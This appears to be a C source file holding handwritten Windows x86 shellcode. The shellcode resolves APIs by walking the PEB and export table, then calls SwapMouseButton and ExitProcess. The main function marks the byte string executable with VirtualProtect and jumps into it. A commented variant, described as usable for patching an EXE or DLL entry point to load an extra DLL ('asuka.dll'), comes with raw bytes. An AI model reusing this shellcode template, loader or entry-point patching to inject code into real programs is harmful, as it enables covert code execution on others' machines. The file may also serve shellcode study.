
#include <Windows.h>

/*
xor ecx, ecx
mov eax, fs:[ecx + 0x30]; EAX = PEB
mov eax, [eax + 0xc]; EAX = PEB->Ldr
mov esi, [eax + 0x14]; ESI = PEB->Ldr.InMemOrder
lodsd; EAX = Second module
xchg eax, esi; EAX = ESI, ESI = EAX
lodsd; EAX = Third(kernel32)
mov ebx, [eax + 0x10]; EBX = Base address
mov edx, [ebx + 0x3c]; EDX = DOS->e_lfanew
add edx, ebx; EDX = PE Header
mov edx, [edx + 0x78]; EDX = Offset export table
add edx, ebx; EDX = Export table
mov esi, [edx + 0x20]; ESI = Offset namestable
add esi, ebx; ESI = Names table
xor ecx, ecx; EXC = 0

Get_Function:

inc ecx; Increment the ordinal
lodsd; Get name offset
add eax, ebx; Get function name
cmp dword ptr[eax], 0x50746547; GetP
jnz Get_Function
cmp dword ptr[eax + 0x4], 0x41636f72; rocA
jnz Get_Function
cmp dword ptr[eax + 0x8], 0x65726464; ddre
jnz Get_Function
mov esi, [edx + 0x24]; ESI = Offset ordinals
add esi, ebx; ESI = Ordinals table
mov cx, [esi + ecx * 2]; Number of function
dec ecx
mov esi, [edx + 0x1c]; Offset address table
add esi, ebx; ESI = Address table
mov edx, [esi + ecx * 4]; EDX = Pointer(offset)
add edx, ebx; EDX = GetProcAddress

xor ecx, ecx; ECX = 0
push ebx; Kernel32 base address
push edx; GetProcAddress


push ecx; 0
push 0x41797261; aryA
push 0x7262694c; Libr
push 0x64616f4c; Load
push esp; "LoadLibrary"
push ebx; Kernel32 base address
call edx; GetProcAddress("LoadLibraryA")

add esp, 0xc; pop "LoadLibrary"
pop ecx; ECX = 0


push eax; EAX = LoadLibrary


push ecx
mov cx, 0x6c6c; ll
push ecx
push 0x642e3233; 32.d
push 0x72657375; user
push esp; "user32.dll"
call eax; LoadLibrary("user32.dll")

add esp, 0x10; Clean stack


mov edx, [esp + 0x4]; EDX = GetProcAddress
xor ecx, ecx; ECX = 0
push ecx
mov ecx, 0x616E6F74; tona
push ecx
sub dword ptr[esp + 0x3], 0x61; Remove "a"
push 0x74754265; eBut
push 0x73756F4D; Mous
push 0x70617753; Swap
push esp; "SwapMouseButton"
push eax; user32.dll address
call edx; GetProc(SwapMouseButton)

add esp, 0x14; Cleanup stack
xor ecx, ecx; ECX = 0
inc ecx; true
push ecx; 1
call eax; Swap!

add esp, 0x4; Clean stack
pop edx; GetProcAddress
pop ebx; kernel32.dll base address
mov ecx, 0x61737365; essa
push ecx
sub dword ptr[esp + 0x3], 0x61; Remove "a"
push 0x636f7250; Proc
push 0x74697845; Exit
push esp
push ebx; kernel32.dll base address
call edx; GetProc(Exec)
xor ecx, ecx; ECX = 0
push ecx; Return code = 0
call eax; ExitProcess
*/

/*
013C6B30    33C9            xor     ecx, ecx
013C6B32    64:8B41 30      mov     eax, dword ptr fs:[ecx+0x30]
013C6B36    8B40 0C         mov     eax, dword ptr [eax+0xC]
013C6B39    8B70 14         mov     esi, dword ptr [eax+0x14]
013C6B3C    AD              lods    dword ptr [esi]
013C6B3D    96              xchg    eax, esi
013C6B3E    AD              lods    dword ptr [esi]
013C6B3F    8B58 10         mov     ebx, dword ptr [eax+0x10]
013C6B42    8B53 3C         mov     edx, dword ptr [ebx+0x3C]
013C6B45    03D3            add     edx, ebx
013C6B47    8B52 78         mov     edx, dword ptr [edx+0x78]
013C6B4A    03D3            add     edx, ebx
013C6B4C    8B72 20         mov     esi, dword ptr [edx+0x20]
013C6B4F    03F3            add     esi, ebx
013C6B51    33C9            xor     ecx, ecx
013C6B53    41              inc     ecx
013C6B54    AD              lods    dword ptr [esi]
013C6B55    03C3            add     eax, ebx
013C6B57    8138 47657450   cmp     dword ptr [eax], 0x50746547
013C6B5D  ^ 75 F4           jnz     short 013C6B53
013C6B5F    8178 04 726F634>cmp     dword ptr [eax+0x4], 0x41636F72
013C6B66  ^ 75 EB           jnz     short 013C6B53
013C6B68    8178 08 6464726>cmp     dword ptr [eax+0x8], 0x65726464
013C6B6F  ^ 75 E2           jnz     short 013C6B53
013C6B71    8B72 24         mov     esi, dword ptr [edx+0x24]
013C6B74    03F3            add     esi, ebx
013C6B76    66:8B0C4E       mov     cx, word ptr [esi+ecx*2]
013C6B7A    49              dec     ecx
013C6B7B    8B72 1C         mov     esi, dword ptr [edx+0x1C]
013C6B7E    03F3            add     esi, ebx
013C6B80    8B148E          mov     edx, dword ptr [esi+ecx*4]
013C6B83    03D3            add     edx, ebx
013C6B85    33C9            xor     ecx, ecx
013C6B87    53              push    ebx
013C6B88    52              push    edx
013C6B89    51              push    ecx
013C6B8A    68 61727941     push    0x41797261
013C6B8F    68 4C696272     push    0x7262694C
013C6B94    68 4C6F6164     push    0x64616F4C
013C6B99    54              push    esp
013C6B9A    53              push    ebx
013C6B9B    FFD2            call    edx
013C6B9D    83C4 0C         add     esp, 0xC
013C6BA0    59              pop     ecx
013C6BA1    50              push    eax
013C6BA2    51              push    ecx
013C6BA3    66:B9 6C6C      mov     cx, 0x6C6C
013C6BA7    51              push    ecx
013C6BA8    68 33322E64     push    0x642E3233
013C6BAD    68 75736572     push    0x72657375
013C6BB2    54              push    esp
013C6BB3    FFD0            call    eax
013C6BB5    83C4 10         add     esp, 0x10
013C6BB8    8B5424 04       mov     edx, dword ptr [esp+0x4]
013C6BBC    33C9            xor     ecx, ecx
013C6BBE    51              push    ecx
013C6BBF    B9 746F6E61     mov     ecx, 0x616E6F74
013C6BC4    51              push    ecx
013C6BC5    836C24 03 61    sub     dword ptr [esp+0x3], 0x61
013C6BCA    68 65427574     push    0x74754265
013C6BCF    68 4D6F7573     push    0x73756F4D
013C6BD4    68 53776170     push    0x70617753
013C6BD9    54              push    esp
013C6BDA    50              push    eax
013C6BDB    FFD2            call    edx
013C6BDD    83C4 14         add     esp, 0x14
013C6BE0    33C9            xor     ecx, ecx
013C6BE2    41              inc     ecx
013C6BE3    51              push    ecx
013C6BE4    FFD0            call    eax
013C6BE6    83C4 04         add     esp, 0x4
013C6BE9    5A              pop     edx
013C6BEA    5B              pop     ebx
013C6BEB    B9 65737361     mov     ecx, 0x61737365
013C6BF0    51              push    ecx
013C6BF1    836C24 03 61    sub     dword ptr [esp+0x3], 0x61
013C6BF6    68 50726F63     push    0x636F7250
013C6BFB    68 45786974     push    0x74697845
013C6C00    54              push    esp
013C6C01    53              push    ebx
013C6C02    FFD2            call    edx
013C6C04    33C9            xor     ecx, ecx
013C6C06    51              push    ecx
013C6C07    FFD0            call    eax                                             ; KERNEL32.ExitProcess


*/










/*
013C6B30    33C9            xor     ecx, ecx
013C6B32    64:8B41 30      mov     eax, dword ptr fs:[ecx+0x30]
013C6B36    8B40 0C         mov     eax, dword ptr [eax+0xC]
013C6B39    8B70 14         mov     esi, dword ptr [eax+0x14]
013C6B3C    AD              lods    dword ptr [esi]
013C6B3D    96              xchg    eax, esi
013C6B3E    AD              lods    dword ptr [esi]
013C6B3F    8B58 10         mov     ebx, dword ptr [eax+0x10]
013C6B42    8B53 3C         mov     edx, dword ptr [ebx+0x3C]
013C6B45    03D3            add     edx, ebx
013C6B47    8B52 78         mov     edx, dword ptr [edx+0x78]
013C6B4A    03D3            add     edx, ebx
013C6B4C    8B72 20         mov     esi, dword ptr [edx+0x20]
013C6B4F    03F3            add     esi, ebx
013C6B51    33C9            xor     ecx, ecx
013C6B53    41              inc     ecx
013C6B54    AD              lods    dword ptr [esi]
013C6B55    03C3            add     eax, ebx
013C6B57    8138 47657450   cmp     dword ptr [eax], 0x50746547
013C6B5D  ^ 75 F4           jnz     short 013C6B53
013C6B5F    8178 04 726F634>cmp     dword ptr [eax+0x4], 0x41636F72
013C6B66  ^ 75 EB           jnz     short 013C6B53
013C6B68    8178 08 6464726>cmp     dword ptr [eax+0x8], 0x65726464
013C6B6F  ^ 75 E2           jnz     short 013C6B53
013C6B71    8B72 24         mov     esi, dword ptr [edx+0x24]
013C6B74    03F3            add     esi, ebx
013C6B76    66:8B0C4E       mov     cx, word ptr [esi+ecx*2]
013C6B7A    49              dec     ecx
013C6B7B    8B72 1C         mov     esi, dword ptr [edx+0x1C]
013C6B7E    03F3            add     esi, ebx
013C6B80    8B148E          mov     edx, dword ptr [esi+ecx*4]
013C6B83    03D3            add     edx, ebx
013C6B85    33C9            xor     ecx, ecx
013C6B87    53              push    ebx
013C6B88    52              push    edx
013C6B89    51              push    ecx
013C6B8A    68 61727941     push    0x41797261
013C6B8F    68 4C696272     push    0x7262694C
013C6B94    68 4C6F6164     push    0x64616F4C
013C6B99    54              push    esp
013C6B9A    53              push    ebx
013C6B9B    FFD2            call    edx
013C6B9D    83C4 0C         add     esp, 0xC
013C6BA0    59              pop     ecx
013C6BA1    50              push    eax
013C6BA2    51              push    ecx
013C6BA3    66:B9 6C6C      mov     cx, 0x6C6C
013C6BA7    51              push    ecx
013C6BA8    68 33322E64     push    0x642E3233
013C6BAD    68 75736572     push    0x72657375
013C6BB2    54              push    esp
013C6BB3    FFD0            call    eax
013C6BB5    83C4 10         add     esp, 0x10
013C6BB8    83C4 0C         add     esp, 0xC
013C6BBB  - E9 2F5371DD     jmp     DEADBEEF


*/

//LoadLibraryA("asuka.dll")
//可以用于修改 EXE/DLL 的OEP，来加载额外的dll
/*

60 33 C9 64 8B 41 30 8B 40 0C 8B 70 14 AD 96 AD 8B 58 10 8B 53 3C 03 D3 8B 52 78 03 D3 8B 72 20
03 F3 33 C9 41 AD 03 C3 81 38 47 65 74 50 75 F4 81 78 04 72 6F 63 41 75 EB 81 78 08 64 64 72 65
75 E2 8B 72 24 03 F3 66 8B 0C 4E 49 8B 72 1C 03 F3 8B 14 8E 03 D3 33 C9 53 52 51 68 61 72 79 41
68 4C 69 62 72 68 4C 6F 61 64 54 53 FF D2 83 C4 0C 59 50 51 66 B9 6C 00 51 68 61 2E 64 6C 68 61
73 75 6B 54 FF D0 83 C4 10 83 C4 0C 61 E9 DD 6B 55 77

*/


int main()
{
	const char *shellcode =
		"\x33\xC9\x64\x8B\x41\x30\x8B\x40\x0C\x8B\x70\x14\xAD\x96\xAD\x8B\x58\x10\x8B\x53\x3C\x03\xD3\x8B\x52\x78\x03\xD3\x8B\x72\x20\x03"
		"\xF3\x33\xC9\x41\xAD\x03\xC3\x81\x38\x47\x65\x74\x50\x75\xF4\x81\x78\x04\x72\x6F\x63\x41\x75\xEB\x81\x78\x08\x64\x64\x72\x65\x75"
		"\xE2\x8B\x72\x24\x03\xF3\x66\x8B\x0C\x4E\x49\x8B\x72\x1C\x03\xF3\x8B\x14\x8E\x03\xD3\x33\xC9\x53\x52\x51\x68\x61\x72\x79\x41\x68"
		"\x4C\x69\x62\x72\x68\x4C\x6F\x61\x64\x54\x53\xFF\xD2\x83\xC4\x0C\x59\x50\x51\x66\xB9\x6C\x6C\x51\x68\x33\x32\x2E\x64\x68\x75\x73"
		"\x65\x72\x54\xFF\xD0\x83\xC4\x10\x8B\x54\x24\x04\x33\xC9\x51\xB9\x74\x6F\x6E\x61\x51\x83\x6C\x24\x03\x61\x68\x65\x42\x75\x74\x68"
		"\x4D\x6F\x75\x73\x68\x53\x77\x61\x70\x54\x50\xFF\xD2\x83\xC4\x14\x33\xC9"
		"\x41" // inc ecx - Remove this to restore the functionality
		"\x51\xFF\xD0\x83\xC4\x04\x5A\x5B\xB9\x65\x73\x73\x61"
		"\x51\x83\x6C\x24\x03\x61\x68\x50\x72\x6F\x63\x68\x45\x78\x69\x74\x54\x53\xFF\xD2\x33\xC9\x51\xFF\xD0";

	// Set memory as executable

	DWORD old = 0;
	BOOL ret = VirtualProtect((void*)shellcode, strlen(shellcode), PAGE_EXECUTE_READWRITE, &old);

	// Call the shellcode

	__asm
	{
		jmp shellcode;
	}

	return 0;
}